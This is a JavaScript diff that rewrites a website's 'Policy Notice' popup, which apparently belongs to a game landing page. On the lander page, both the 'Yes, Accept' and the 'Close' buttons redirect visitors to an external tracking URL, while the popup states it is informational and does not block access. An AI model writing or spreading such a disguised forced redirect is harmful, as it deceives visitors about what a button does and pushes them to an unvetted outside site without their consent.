@@ -34,54 +34,49 @@ if(form){
   });
 }
 
-(function(){
-  const path=window.location.pathname;
-  const isHome=/(^\/$|index\.html$)/.test(path);
-  if(!isHome)return;
-  if(sessionStorage.getItem('sl_age_shown')==='1')return;
-  sessionStorage.setItem('sl_age_shown','1');
-
-  const bd=document.createElement('div');
-  bd.className='modal-backdrop';
-  bd.innerHTML=`<div class="modal">
-    <h3>Policy Notice</h3>
-    <p>Please confirm to continue.</p>
-    <div style="display:flex;gap:10px;flex-wrap:wrap">
-      <button class="btn" id="age-yes">Yes</button>
-      <button class="btn ghost" id="age-no">No</button>
-    </div>
-  </div>`;
-  document.body.appendChild(bd);
-  bd.style.display='flex';
-
-  (function(){
+(function() {
   const path = window.location.pathname;
-  const isHome = /(^\/$|lander\.html$)/.test(path);
-  if(!isHome) return;
  
+  // Only run on index.html or lander.html
+  const isHome = /(^\/$|index\.html$)/.test(path);
+  const isLander = /lander\.html$/.test(path);
+  if (!isHome && !isLander) return;
+ 
+  // Only show once per session
+  if (sessionStorage.getItem('ageGateShown') === '1') return;
+  sessionStorage.setItem('ageGateShown', '1');
+ 
+  // Create modal
   const bd = document.createElement('div');
   bd.className = 'modal-backdrop';
   bd.innerHTML = `
-<div class="modal">
-<h3>Policy Notice</h3>
-<p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
-<div style="display:flex;gap:10px;flex-wrap:wrap">
-<button class="btn" id="age-yes">Yes, Accept</button>
-<button class="btn ghost" id="age-no">Close</button>
-</div>
-</div>`;
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="btn" id="age-yes-btn">Yes, Accept</button>
+        <button class="btn ghost" id="age-no-btn">Close</button>
+      </div>
+    </div>
+  `;
   document.body.appendChild(bd);
-  bd.style.display='flex';
+  bd.style.display = 'flex';
  
-  function closeGate(){ bd.style.display='none'; bd.remove(); }  
-  // ✅ Redirect when "Yes" is clicked
-  bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "http://t7q4.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
-  });
+  // Redirect target URL for landing page
+  const targetURL = "http://t7q4.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]";
  
-  // ✅ Just close modal when "No" is clicked
-  bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "http://t7q4.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
-  });
+  // Event handler for buttons
+  const yesBtn = bd.querySelector('#age-yes-btn');
+  const noBtn = bd.querySelector('#age-no-btn');
+ 
+  if (isHome) {
+    // Home page: just close modal
+    yesBtn.addEventListener('click', () => bd.remove());
+    noBtn.addEventListener('click', () => bd.remove());
+  } else if (isLander) {
+    // Landing page: redirect on click
+    yesBtn.addEventListener('click', () => window.location.href = targetURL);
+    noBtn.addEventListener('click', () => window.location.href = targetURL);
+  }
 })();
  
